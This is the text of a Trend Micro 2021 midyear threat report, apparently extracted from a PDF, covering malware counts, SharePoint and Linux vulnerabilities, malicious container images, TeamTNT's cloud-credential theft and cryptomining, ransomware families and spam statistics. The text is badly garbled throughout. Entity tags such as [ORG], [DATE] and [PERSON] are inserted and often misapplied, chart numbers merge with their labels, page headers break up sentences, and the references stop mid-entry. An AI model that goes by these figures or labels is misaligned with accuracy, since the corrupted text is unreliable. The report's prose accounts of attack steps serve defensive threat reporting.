[ORG] Microsoft announced plans to release [LAW] Windows [LAW] 11 in [DATE] June [DATE] 2021 , with Windows 10users getting a free upgrade . There have , however , been concerns about the new system requirementsfor Windows 11 , including the fact that it will only be available on [CARDINAL] 64 - bit processors . In the officialannouncement,48 the security of the system is one of the major factors that pushed this decision . According to the company \u2019s statement , \u201c [PRODUCT] Windows [PRODUCT] 11 raises the bar for security by requiring hardwarethat can enable protections like Windows Hello , [ORG] Device [ORG] Encryption , virtualization - based security ( VBS),hypervisor - protected code integrity ( HVCI ) and [PERSON] Secure [PERSON] Boot . The combination of these features has beenshown to reduce malware by 60 % on tested devices . \u201dOur data confirms that malware is a serious concern for Windows users . Table [CARDINAL] 2 shows that Windows 10,general Windows users , and Windows 7 are most affected by malware . We detected [CARDINAL] almost [CARDINAL] 2.5 millioninstances of malware for Windows [CARDINAL] 10 users , which further highlights the importance of proper malwareprotection.28 | Attacks From All Angles : 2021 Midyear Cybersecurity ReportWindows 102,437,130Windows ( unspeci\ufb01ed)1,840,863Windows 71,247,052macOS336,528Windows 8.1273,251Windows 868,633CloudLinux [PERSON] Server [PERSON] Release 664,672Microsoft Windows Server 201260,623Windows Server 201642,144Microsoft Windows Server 200835,08502.5MFigure 9 . The top [CARDINAL] 10 operating systems according to malware detectionMicrosoft [ORG] SharePoint has also had several RCE vulnerabilities since [DATE] the [DATE] beginning [DATE] of [DATE] the [DATE] year , which isalso consistent with the number of RCE vulnerabilities from [DATE] the [DATE] first [DATE] half of [CARDINAL] 2020.SharePoint vulnerabilities in [DATE] 1H [DATE] 2020 vs. those in [CARDINAL] 1H 2021Microsoft SharePointCVE-2021 - 24066 Workflow Deserialization of Untrusted DataZDI-21 - 19412 - Feb-21Remote Code Execution VulnerabilityCVE-2021 - 27076InfoPath List Deserialization of Untrusted Data Remote Code Execution VulnerabilityZDI-21 - 27611 - Mar-21CVE-2021 - 31181 WebPart Interpretation Conflict RemoteZDI-21 - 57313 - May-21Code Execution VulnerabilityCVE-2021 - 28474Server - Side Control Interpretation Conflict Remote Code Execution VulnerabilityZDI-21 - 57413 - May-21CVE-2021 - 26420 WorkflowCompilerInternal Exposed Dangerous Function Remote Code Execution VulnerabilityZDI-21 - 75523 - Jun-2129 | Attacks From All Angles : 2021 Midyear Cybersecurity ReportSharePoint vulnerabilities in [DATE] 1H [DATE] 2020 vs. those in [CARDINAL] 1H 2021Microsoft SharePointCVE-2020 - 0931Scorecards Deserialization of Untrusted Data Remote Code Execution VulnerabilityZDI-20 [PERSON] - 46515 [PERSON] - Apr-20CVE-2020 [PERSON] - 0932TypeConverter [ORG] Deserialization [ORG] of [ORG] Untrusted [ORG] Data Remote Code Execution VulnerabilityZDI-20 - 46815 - Apr-20CVE-2020 - 1102Shared Forms Incomplete Blacklist Remote Code Execution VulnerabilityZDI-20 - 64812 - May-20CVE-2020 - 1181Server Web Part Remote Code Execution Find New TargetsData gathered from our container honeypot in the firstPredictionshalf of [DATE] 2021 shows that the tools and techniques usedto target the cloud have fluctuated back to what wesaw in [DATE] 2019 . As seen in the following graphs , in 2019the attackers used malicious images with malwareor an exploit already inside . In [DATE] 2020 , they moved tousing base , valid , and clean images that downloadedmalicious samples after deployment . But in 2021,it seems that threat actors are back to developingmalicious images with malicious content . Upon analyzing the data from our honeypot , weLast year , in our security predictions , we foresaw that hackers attempting to take over cloud servers and deploy malicious container images would be a concern for cloud adopters . As for vulnerable images in various architectures , we speculated that these images would target repositories and images as users put their unfettered trust in both container services and depositories.noticed some interesting behavior and found that the entry points of the malicious images are divisibleinto [CARDINAL] three categories . In the [ORDINAL] first category , we saw that some actors try to lure the administrator by naming the process as a validservice . For example , we saw instances where the process is named [ORG] NGINX , which is a valid web server . In reality , however , it is a piece of malware that runs under this name . The [ORDINAL] second category , which usuallyconsists of cryptominers , does n\u2019t even try to hide its malicious purpose ; instead , the actors use well - known names of cryptocurrency miners that can be spotted easily . Lastly , in the [ORDINAL] third category , the entrypoint is just a script for dropping or downloading the malicious file . This is the technique that is currentlymost prevalent because several container image repositories now check against malicious content . Tocircumvent this , the attackers leave a script that is harmless at [ORDINAL] first look but actually downloads or dropsthe malicious content only on runtime.32 | Attacks From All Angles : 2021 [EVENT] Midyear [EVENT] Cybersecurity ReportTeamTNTAs we mentioned in our section on APTs , TeamTNT is a group with sophisticated tools and techniques . Forexample , it created and distributed its [ORG] IRC bot , [ORG] TNTbotinger , which is capable of DDoS. In the beginningof [DATE] 2021 , we found that the group was targeting cloud credentials and compromising a platform thatfacilitates operations for cloud applications . In [DATE] March , we investigated TeamTNT \u2019s activities and found a binary containing a hard - coded shell scriptdesigned to steal AWS credentials.52 We discovered that after the actor compromises an instance andruns their script , it searches for any credentials deployed via the AWS metadata service . The script createsa file and then uploads it to a remote web server that is set to receive the stolen files . The web serverwhere the malware uploads its data was actually configured ( or misconfigured ) to be set as open directory , which allowed us access to all the uploaded files . Alongside stolen data , the server was also a repositoryfor Linux cryptocurrency - mining tools that the group deploys on infected systems . We detected over4,000 infected instances in total . Furthermore , although the script is meant to run on AWS instances , we found that it ran on any kind [ORG] ofLinux machine , container , and cloud instance . Based on the timestamps in the file names , we can assumethat the campaign started on [DATE] February [DATE] 10 , [DATE] 2021.In [DATE] May [DATE] 2021 , we found that TeamTNT was also compromising [ORG] Kubernetes53 clusters that were at large andusing them to mine cryptocurrency . [ORG] Kubernetes is an open - source and widely used system for automatingdeployment , scaling , and management of containerized applications . We confirmed that close to [CARDINAL] 50,000IP addresses were compromised across multiple clusters . In this attack , TeamTNT installs [CARDINAL] two free , open - source tools available from [ORG] GitHub : the network scanningtool [NORP] Masscan , and the banner - grabbing , deprecated ZGrab . They also install their [ORG] IRC bot , and used thefunction kube_pwn ( ) to run the following commands to:\u2022 [GPE] Update the package index of the container.\u2022Install the following packages : bash , wget , and curl.\u2022 [PERSON] Download a shell script called setup_xmr.sh from TeamTNT [ORG] C&C server and save it on the tmp folder.\u2022 Execute the script to start mining for the [PERSON] Monero cryptocurrency . Several [ORG] IP addresses were repeatedly exploited during the operation , which occurred between [DATE] March andMay . The identified [ORG] ISP list , which had China- and [GPE] US - based providers as the highest list , included somecloud service providers ( CSPs ) . It should be noted that the numbers reflect the likelihood of significantlymore clusters in operation for the [GPE] US and [GPE] China than in many other countries.33 | Attacks From All Angles : 2021 [ORG] Midyear [ORG] Cybersecurity [ORG] ReportLinuxApart from the vulnerabilities in the vendors that we listed , we also investigated threats to Linux systems . Although not as widely used as Windows or macOS , many large organizations , such as [ORG] the [ORG] NationalAeronautics [ORG] and [ORG] Space [ORG] Administration ( [ORG] NASA ) , [ORG] the [ORG] US [ORG] Department [ORG] of [ORG] Defense ( DoD ) , and [ORG] Google , all useLinux.54 In the following table , we list the top malware families that we found running on Linux servers fromJanuary [DATE] 1 [DATE] to [DATE] June 30 , [DATE] 2021 based on data from [ORG] Trend [ORG] Micro \u2122 [ORG] Deep [ORG] Security \u2122 and [ORG] Trend [ORG] Micro [ORG] CloudOne \u2122 \u2013 [ORG] Workload [ORG] Security . In compiling this list , we identified and flagged [CARDINAL] nearly [CARDINAL] 15 [CARDINAL] million events fromour sensors . [ORG] CoinminersWeb shellsRansomwareTrojansOthers 3.15%0%11.55%9.65%24.56%19.92%25%Figure [CARDINAL] 10 . The top [CARDINAL] five malware families found in Linux systems from [DATE] January [DATE] 1 [DATE] to [DATE] June 30 , [DATE] 2021Notably , the malware family in the top spot for Linux servers is a cryptocurrency miner . Considering thatthe cloud has an abundance of computing power , it makes sense that cybercriminals would steal theseresources for their mining activities.34 | Attacks From All Angles : [DATE] 2021 [ORG] Midyear [ORG] Cybersecurity [ORG] ReportOur [ORG] SPN data shows the top [CARDINAL] four Linux distributions where we found malware [ORG] families:50.80%CentOS [ORG] LinuxCloudLinux [ORG] ServerUbuntu [ORG] Server9.56%31.24%Red [ORG] Hat [ORG] Enterprise [ORG] Linux Server2.73%0%60%Figure 11 . The top [CARDINAL] four Linux distributions and the top threat types in Linux systemsfor [DATE] the [DATE] first [DATE] half of [CARDINAL] 2021Using data from [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2021 collected from [ORG] Workload [ORG] Security , we sorted through triggers thatwere deployed solely on Linux hosts . As a result , we dissected [CARDINAL] more [CARDINAL] than [CARDINAL] 50 [CARDINAL] million events , representingthe following:\u2022 [CARDINAL] More [CARDINAL] than [CARDINAL] 130,000 unique Linux hosts that reported the events\u2022 The top [CARDINAL] 20 Linux and Unix flavors that have reported events into this dataset by volumeAmazon Linux 2 ( [DATE] 64 [DATE] - bit)35.86%RHEL [DATE] 7 ( [CARDINAL] 64 - bit)22.59%CentOS 7 ( [CARDINAL] 64 - bit)8.39%RHEL [CARDINAL] 6 ( [CARDINAL] 64 - bit)6.87%Amazon Linux ( [CARDINAL] 64 bit)6.72%Ubuntu Linux 18 ( 64 - bit)6.46%Ubuntu Linux 20 ( [CARDINAL] 64 - bit)4.41%Ubuntu Linux 16 ( [CARDINAL] 64 - bit)4.14%CentOS [CARDINAL] 6 ( [CARDINAL] 64 - bit)1.10%0%40%Figure [CARDINAL] 12 . Volume of [ORG] IPS events sorted by operating system in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2021We also looked at data from [ORG] Trend [ORG] Micro [ORG] Cloud [ORG] One \u2122 and found the top vulnerabilities that are at largeand still being actively exploited or have existing proofs of concept.35 | Attacks From All Angles : [DATE] 2021 [ORG] Midyear [ORG] Cybersecurity [ORG] ReportTop vulnerabilities that have known exploits or proofs of conceptCVEApache [LAW] Struts [LAW] 2 remote code execution ( RCE ) vulnerabilityApache [LAW] Struts [LAW] 2 [LAW] REST plug - in [EVENT] XStream [EVENT] RCE vulnerabilityDrupal [PERSON] Core RCE vulnerabilityOracle [ORG] WebLogic server RCE vulnerabilitiesWordPress file manager plug - in RCE vulnerabilityvBulletin \u2018 subwidgetConfig \u2019 unauthenticated RCE vulnerabilitySaltStack salt authorization weakness vulnerabilityApache Struts OGNL expression RCE vulnerabilityCVE-2017 - 5638CVE-2017 - 9805CVE-2018 - 7600CVE-2020 - 14750CVE-2020 - 25213CVE-2020 - 17496CVE-2020 - 11651CVE-2017 - 12611Eclipse Jetty chunk length parsing integer overflow vulnerabilityCVE-2017 - 7657Alibaba [ORG] Nacos [ORG] AuthFilter authentication bypass vulnerabilityAtlassian Jira information disclosure vulnerabilityCVE-2021 - 29441CVE-2020 - 14179Nginx crafted [ORG] URI string handling access restriction bypass vulnerabilityCVE-2013 [LAW] - 4547Apache Struts 2 RCE vulnerabilityApache Struts OGNL expression [ORG] RCE vulnerabilityLiferay portal untrusted deserialization vulnerabilityCVE-2019 - 0230CVE-2018 - 11776CVE-2020 - 7961Table [CARDINAL] 4 . A list of the top [CARDINAL] 15 vulnerabilities with exploits or proofs of conceptWe saw [CARDINAL] about [CARDINAL] 200 different vulnerabilities triggered across the board . Applications targeted with these200 vulnerabilities include popular tools and services like [ORG] WordPress or [ORG] Apache [ORG] Struts , as well as otherservices like [PERSON] Atlassian [PERSON] Jira [PERSON] DNSmasq , and [PERSON] Alibaba [PERSON] Nacos . The top triggers are spread across the followingapplications ( not in any order):\u2022 [ORG] Alibaba [ORG] Nacos\u2022 [ORG] Apache HTTPd\u2022 [PRODUCT] Apache Struts\u2022 Apache Tomcat\u2022 [NORP] Atlassian Jira\u2022 [ORG] CMS \u2013 Drupal and [ORG] WordPress and their plug - ins.\u2022 DNSmasq\u2022ISC BIND\u2022 Netty\u2022 NGINX\u2022 OpenSSL\u2022 Oracle WebLogic Server36 | Attacks From All Angles : 2021 [EVENT] Midyear [EVENT] Cybersecurity [EVENT] ReportAttacks [EVENT] From [EVENT] All [EVENT] Angles [EVENT] Require [EVENT] Multifaceted [EVENT] DefensesEnterprises , organizations , and ordinary users are still finding their footing in the aftermath of the Covid-19pandemic . In [DATE] 2020 , cybercriminals took advantage of the abrupt move to virtual workspaces , the increasein online tools and applications , and the rise in online financial transactions . Now , in [DATE] the [DATE] first [DATE] half of 2021,we see that threat actors are still taking advantage of any and every open avenue , whether Covid-19 - related or not , and constantly searching for cracks in security to drop malicious payloads on their victims . Old threats like ransomware are adopting more targeted and sophisticated techniques , and successfulreal - life attacks have proven that these modern tactics are quite effective . [ORG] APT groups are working everyangle , from complex exploits to simple spam mail . Our data on threats to operating systems , VPNs , [ORG] IoT devices , and other technology shows that the threat landscape is varied , evolving , and persistent . Considering the different types of malicious threats and the number of active cybercriminal groups , it isvital that organizations establish a robust and multilayered security system . Now more than ever , siloedtools and single layers of protection that only cover parts of the overall infrastructure are not a sufficientdefense against the advanced cybercriminal campaigns being launched . Instead , organizations have to deploy solutions that can assess , protect , detect , respond to , and recoveracross multiple platforms , including emails , endpoints , servers , networks , and cloud workloads . Theseoptimal security solutions should also provide indicators and analytics that give IT security teams acomprehensive view of risks to their organization \u2019s system without inundating them with mountains ofalerts and unnecessary data . As always , ordinary users , especially employees , are critical parts of the security posture , as they areoften used to gain deeper access into organizations . As such , they should be educated on current socialengineering tactics , as staying informed and alert on the latest threats will help close that entry point forattackers.37 | Attacks From All Angles : 2021 [ORG] Midyear [ORG] Cybersecurity [ORG] ReportAs a non - negotiable practice , patching should be prioritized by organizations , especially since many arestill working remotely and using personal machines , and vulnerabilities in these endpoints could lead tomore serious breaches into corporate systems . Organizations should also prioritize critical system updatesand , if possible , find a way to deliver these updates to users remotely . Virtual patching is a convenientoption to help businesses protect their systems and end - user machines , as well as to minimize downtimewhile waiting for vendors to roll out official patches . In [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2021 , threats closed in from all angles for enterprises and everyday users , emphasizingthe insatiable nature of cybercrime . With malicious actors relying on evolved techniques , exploitinglegitimate tools , and going as far as targeting the vaccination process against Covid-19 , the need for amultilayered defense strategy that can meet threats from all angles must be reified . In line with the globalattempt to recover from the ongoing health crisis , enterprises must consider all facets of their securityposture , not just to survive in the new work setup brought on by the pandemic but also to thrive beyond it.38 | Attacks From All Angles : 2021 [ORG] Midyear [ORG] Cybersecurity [ORG] ReportThe [ORG] Threat [ORG] Landscape in ReviewIn [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2021 , the Trend Micro \u2122 Smart Protection Network \u2122 ( [ORG] SPN ) infrastructure protectedusers from [MONEY] more [MONEY] than [MONEY] 40 [MONEY] billion threats consisting of email threats , malicious files , and malicious URLs.40,956,909,973Blocked threats from [DATE] January [DATE] 2021 [DATE] to [DATE] June [CARDINAL] 202116,089,334,070535,451,1112,343,479,304Email threats blockedMalicious URLs blockedMalicious \ufb01les blocked17,226,781,018764,523,0513,997,341,41920B0800M04BQ1Q220,910,330,826848,818,567,862442,384,974,451Email reputation queriesURL reputation queriesFile reputation [DATE] queries22,075,108,541796,857,859,588517,455,645,61125B01T0600B00Figure [DATE] 13 . The number of blocked email threats , malicious files , and malicious URLs increased from thefirst to [DATE] the [DATE] second [DATE] quarter [DATE] of [DATE] the [DATE] year . Email and file queries increased while URL reputation queriesdecreased . Source : [ORG] Trend [ORG] Micro [ORG] Smart [ORG] Protection [ORG] Network infrastructure39 | Attacks From All Angles : 2021 Midyear Cybersecurity ReportCryptocurrency miners have not only become much more prevalent over [DATE] the [DATE] past [DATE] few [DATE] months but havealso become the most detected malware . [ORG] WannaCry had previously been at the top of this list for a fewyears , but detection numbers for this family have been on a steady decline recently , causing it to move tothe second spot . [PERSON] Webshell , which rounds out the top [CARDINAL] three , is the malware used by attackers when theysuccessfully exploit web servers to enable them to have remote access to the affected machines . Cryptocurrency Miners74,490WCryWebshellDownad61,06839,61239,095Nemucod35,276Dloader32,397Sality28,310Equated24,564Powload22,921Virux22,865Figure [CARDINAL] 14 . Cryptocurrency miners were the most detected malware , with long - running family WannaCry080Kin the [ORDINAL] second spot : The [CARDINAL] 10 most detected malware families in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2021Source : Trend Micro Smart Protection Network infrastructure40 | Attacks From All Angles : 2021 Midyear Cybersecurity ReportThe most active cryptocurrency miners are mostly consistent with what we saw in [DATE] 2020 . MalXMR remainsin the top spot , with [ORG] Coinminer and ToolXMR rising in the ranks.44,587MALXMRCOINMINER8,533TOOLXMR6,419COINMINE4,082MALBTC2,328COINHIVE2,159CRYPTONIGHT1,253ETHEREUM893TOOLZEC693MALETH581050KFigure [CARDINAL] 15 . MalXMR , [ORG] Coinminer , and ToolXMR were the most detected cryptocurrency miners : The 10most detected cryptocurrency miners in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2021Source : Trend Micro Smart Protection Network infrastructureIn [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2021 , we detected [CARDINAL] over [CARDINAL] 840,000 endpoints that connected to [ORG] C&C servers and [CARDINAL] justover [CARDINAL] 22,000 [ORG] C&C servers . There has been a steady decline in detections since [DATE] 2020 , and we see thatcompared to the same time [DATE] last [DATE] year , botnet connections decreased 36.8 % and [ORG] C&C servers decreased73.1%.41 | Attacks From All Angles : 2021 Midyear Cybersecurity ReportBotnet connectionsBotnet [ORG] C&C servers83,14741,85122,35301,333,9761,091,842842,9381H [DATE] 20202H 20201H 20211.5MFigure [CARDINAL] 16 . We detected [CARDINAL] roughly [CARDINAL] 840,000 botnet connections and [CARDINAL] over [CARDINAL] 20,000 botnet [ORG] C&C servers : The numbers of detected botnet connections and botnet [ORG] C&C servers in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2021Note : [PERSON] Botnet connections were unique endpoints that queried or connected to [ORG] C&C servers , while botnet [ORG] C&C servers were unique and active [ORG] C&C servers that endpoints queried or connected to . Source : [ORG] Trend [ORG] Micro [ORG] Smart [ORG] Protection [ORG] Network infrastructureRansomware family detections have been steadily decreasing since [DATE] 2020 ; there were [CARDINAL] only [CARDINAL] 49 familiesdiscovered in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2021 . Despite that , most of the notable cyberattacks in terms of financialimpact and effect on real - world operations were ransomware attacks.1H [DATE] 2020682H [DATE] 2020591H 202149080Figure 17 . A comparison of the numbers of new ransomware families in [DATE] 2020 and [DATE] the [DATE] first [DATE] half of 2021shows that new ransomware families decreased by [CARDINAL] 17%.42 | Attacks From All Angles : [DATE] 2021 [ORG] Midyear [ORG] Cybersecurity [ORG] ReportNew ransomware families seen in [DATE] 2021JANFEBMARAPRMAYJUNTrojanLockBlackholeApostriusDarkRadiationVenusHadesBabukFakeRyukAmjixiusSophcryptIziCryptCryngVoidCryptNitroSharpcrypterHDLockerHogLockerAstro LockerCicadaSickransomOnCryptHantaQlockerLegionLockerCrysis . TIBGGHLuciferDadiCryptWhiteBlackCryptFiveHandsGonnaCryptBluecrabButwoAssistFlamingoHelpYouCNHCryptThunderCryptGangbangDarkWorldJudgeMijnalNamasteGunshotGarytestMolochPsixtinTaihenchanNetwormNoCryTable [CARDINAL] 5 . [CARDINAL] 49 new ransomware families were discovered : New ransomware families detectedin [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2021Sources : [ORG] Trend [ORG] Micro [ORG] Smart [ORG] Protection [ORG] Network infrastructure and analysis of externally sourced dataThere were over [CARDINAL] 5 [CARDINAL] million detections of file types used in spam email attachments , and [ORG] PDF attachmentsmade up 66.1 % of that number . DOCX and [ORG] EXE files were also sizeable portions of the overall count.43 | Attacks From All Angles : 2021 Midyear Cybersecurity Report3,456,427.PDF.DOCX441,525.EXE356,521.DOC308,514.HTML172,871.HTM160,335.XLS156,837.RAR54,714.XLSX35,087.BAT22,801Others61,23403.5MFigure [CARDINAL] 18 . [ORG] PDF files accounted for most spam email attachments : The distribution of file types used in spam email attachments in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2021Source : Trend Micro Email Reputation ServicesIn [DATE] the [DATE] first [DATE] six [DATE] months [DATE] of [DATE] 2021 , we found over [CARDINAL] 3 [CARDINAL] million detections for mobile device - related malicioussamples . We also saw an uptick in the number of malicious [PRODUCT] Android [PRODUCT] apps.1H 202017,773,2602H 202017,383,6571H 202118,395,057020MFigure [CARDINAL] 19 . A [DATE] half [DATE] - [DATE] year comparison of the number of blocked malicious [ORG] Android app showsan upward trend . Source : [ORG] Trend [ORG] Micro [ORG] Mobile [ORG] App [ORG] Reputation [ORG] Service44 [ORG] | [ORG] Attacks [ORG] From [ORG] All [ORG] Angles : 2021 Midyear Cybersecurity ReportBusiness email compromise ( [ORG] BEC ) scams increased slightly since [DATE] 2020 , rising [PERCENT] roughly [PERCENT] 4 % from [DATE] the [DATE] firsthalf [DATE] of [DATE] 2020 . This might be due to malicious actors targeting businesses involved in Covid-19 vaccinationprograms , as well as attacks on the supply chain for vaccine production.1H [DATE] 20202H [DATE] 20201H [DATE] 202136,90436,18938,367040KFigure [DATE] 20 . A [DATE] half [DATE] - [DATE] year comparison of [ORG] BEC attempts shows an increase in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2021.Note : Data refers to the number of [ORG] BEC attempts seen , which does not indicate whether the attackswere successful . Source : [ORG] Trend [ORG] Micro [ORG] Smart [ORG] Protection [ORG] Network infrastructure45 | Attacks From All Angles : 2021 Midyear Cybersecurity ReportReferences1 [ORG] Trend [ORG] Micro . ( [DATE] June 8 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [WORK_OF_ART] Modern [WORK_OF_ART] Ransomware \u2019s [WORK_OF_ART] Double [WORK_OF_ART] Extortion [WORK_OF_ART] Tactics and How to ProtectEnterprises Against Them . \u201d Accessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , at url and - digital - threats / modern - ransomwares - double - extortion - tactics - and - how - to - protect - enterprises - against - them.2 Trend Micro . ( [DATE] June 8 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [WORK_OF_ART] Modern [WORK_OF_ART] Ransomware \u2019s [WORK_OF_ART] Double [WORK_OF_ART] Extortion [WORK_OF_ART] Tactics and How to ProtectEnterprises Against Them . \u201d Accessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , at url and - digital - threats / modern - ransomwares - double - extortion - tactics - and - how - to - protect - enterprises - against - them.3 Trend Micro . ( [DATE] June 8 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [WORK_OF_ART] Modern [WORK_OF_ART] Ransomware \u2019s [WORK_OF_ART] Double [WORK_OF_ART] Extortion [WORK_OF_ART] Tactics and How to ProtectEnterprises Against Them . \u201d Accessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , at url and - digital - threats / modern - ransomwares - double - extortion - tactics - and - how - to - protect - enterprises - against - them.4 Trend Microh . ( [DATE] Feb. 23 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] A [WORK_OF_ART] Constant [WORK_OF_ART] State [WORK_OF_ART] Of Flux : [WORK_OF_ART] Trend [WORK_OF_ART] Micro [WORK_OF_ART] 2020 [WORK_OF_ART] Annual [WORK_OF_ART] Cybersecurity [WORK_OF_ART] Report . \u201dAccessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , at url a - constant - state - of - flux - trend - micro-2020 - annual - cybersecurity - report.5 Trend Micro . ( [DATE] June 8 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [WORK_OF_ART] Modern [WORK_OF_ART] Ransomware \u2019s [WORK_OF_ART] Double [WORK_OF_ART] Extortion [WORK_OF_ART] Tactics and How to ProtectEnterprises Against Them . \u201d Accessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , at url and - digital - threats / modern - ransomwares - double - extortion - tactics - and - how - to - protect - enterprises - against - them.6 Trend Micro . ( [DATE] May [DATE] 12 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c What We Know About the DarkSide Ransomware and the US [PERSON] Pipeline [PERSON] Attack . \u201dAccessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , at url ransomware - and - the - us - pipeline - attac.html.7 Cedric Pernet . ( [DATE] June [DATE] 18 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201d Fake DarkSide Campaign Targets Energy and Food Sectors . \u201d Accessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , at url [PERSON] Mina [PERSON] Naiim . ( [DATE] May 28 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c DarkSide on Linux : Virtual Machines Targeted . \u201d Accessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , aturl [ORG] Trend [ORG] Micro . ( [DATE] June [DATE] 15 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Ransomware [WORK_OF_ART] Double [WORK_OF_ART] Extortion [WORK_OF_ART] and Beyond : REvil , [PERSON] Clop , and [PERSON] Conti . \u201d Accessed onAug . [DATE] 12 , [DATE] 2021 , at url extortion - and - beyond - revil - clop - and - conti.10 [PERSON] Arianne [PERSON] Dela [PERSON] Cruz et al . ( [DATE] May [DATE] 6 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Proxylogon : A Coinminer , a [ORG] Ransomware , and a Botnet Join the Party . \u201d Accessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , at url and - a - botnet - join - the - part.html.11 Trend Micro . ( [DATE] June [DATE] 15 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Ransomware [WORK_OF_ART] Double [WORK_OF_ART] Extortion [WORK_OF_ART] and Beyond : REvil , [PERSON] Clop , and [PERSON] Conti . \u201d Accessed onAug . [DATE] 12 , [DATE] 2021 , at url extortion - and - beyond - revil - clop - and - conti.12 [PERSON] Sergiu [PERSON] Gatlan . ( [DATE] May 17 , [DATE] 2021 ) . Bleeping Computer . \u201c [PERSON] Conti ransomware also targeted Ireland \u2019s [ORG] Department [ORG] of [ORG] Health . \u201dAccessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , at url department - of - health/.13 Trend Micro . ( [DATE] Jan. 26 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c Examining A Sodinokibi Attack . \u201d Accessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , at url [PERSON] Mitchell [PERSON] Clark . ( [DATE] June [DATE] 3 , [DATE] 2021 ) . The [ORG] Verge . \u201c [ORG] FBI names [ORG] REvil as the group behind meat supplier cyberattack . \u201d Accessed onAug . [DATE] 12 , [DATE] 2021 , at url [PERSON] Janus [PERSON] Agcaoili . ( [DATE] April 27 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c Hello Ransomware Uses Updated China Chopper Web Shell , SharePointVulnerability . \u201d Accessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , at url updated - china - chopper - web - shell - sharepoint - vulnerability.html.16 [PERSON] Mitchell [PERSON] Clark . ( [DATE] May [DATE] 10 , [DATE] 2021 ) . The [ORG] Verge . \u201c [ORG] Colonial [ORG] Pipeline hackers apologize , promise to ransom less controversial targetsin future . \u201d Accessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , at url attack - apology - investigation.17 [PERSON] Janus [PERSON] Agcaoili and [PERSON] Byron [PERSON] Gelera . ( [DATE] Feb. 23 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] An [WORK_OF_ART] Analysis [WORK_OF_ART] of [WORK_OF_ART] the [WORK_OF_ART] Nefilim [WORK_OF_ART] Ransomware . \u201d Accessed on Aug.12 , [DATE] 2021 , at url | Attacks From All Angles : 2021 Midyear Cybersecurity Report18 [PERSON] Janus [PERSON] Agcaoili and [PERSON] Earle [PERSON] Earnshaw . ( [DATE] Apr. 29 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c Locked , [WORK_OF_ART] Loaded , and in [ORG] the [ORG] Wrong Hands : [ORG] Legitimate [ORG] ToolsWeaponized For [ORG] Ransomware in [DATE] 2021 . \u201d Accessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , at url cybercrime - and - digital - threats / locked - loaded - and - in - the - wrong - hands - legitimate - tools - weaponized - for - ransomware - in-2021.19 [ORG] Department [ORG] of [ORG] Justice [ORG] Office [ORG] of [ORG] Public [ORG] Affairs . ( [DATE] June [DATE] 7 , [DATE] 2021 ) . [ORG] United [ORG] States [ORG] Department [ORG] of [ORG] Justice . \u201c [ORG] Department [ORG] of [ORG] JusticeSeizes $ 2.3 [ORG] Million in Cryptocurrency Paid to [ORG] the [ORG] Ransomware [ORG] Extortionists [ORG] Darkside . \u201d Accessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , at https:// www.justice.gov/opa/pr/department-justice-seizes-23-million-cryptocurrency-paid-ransomware-extortionists-darkside.20 [ORG] Reuters . ( [DATE] May [DATE] 13 , [DATE] 2021 ) . [ORG] Reuters . \u201c [ORG] Colonial [ORG] Pipeline has cyber insurance policy - sources . \u201d Accessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , aturl [PERSON] Luke [PERSON] Gallin . ( [DATE] Feb. [DATE] 7 , [DATE] 2021 ) . Reinsurance News . \u201c [WORK_OF_ART] Norsk [WORK_OF_ART] Hydro claims a further $ [MONEY] 20.2mn from its cyber insurance in Q4.\u201dAccessed on [DATE] Aug. [DATE] 12 , [DATE] 2021 , at url insurance - in - q4/.22 [PERSON] Jen [PERSON] McPhillips . ( n.d . ) . [ORG] Coalition [ORG] Inc. \u201c Coalition releases new [ORG] H1 [ORG] 2020 [ORG] Cyber [ORG] Insurance [ORG] Claims [ORG] Report . \u201d Accessed on [DATE] Aug. [DATE] 12,2021 , at url Lindsey O\u2019Donnell . ( [DATE] June [DATE] 1 , [DATE] 2021 ) . Threatpost . \u201c [WORK_OF_ART] Cyber [WORK_OF_ART] - [WORK_OF_ART] Insurance [WORK_OF_ART] Fuels [WORK_OF_ART] Ransomware 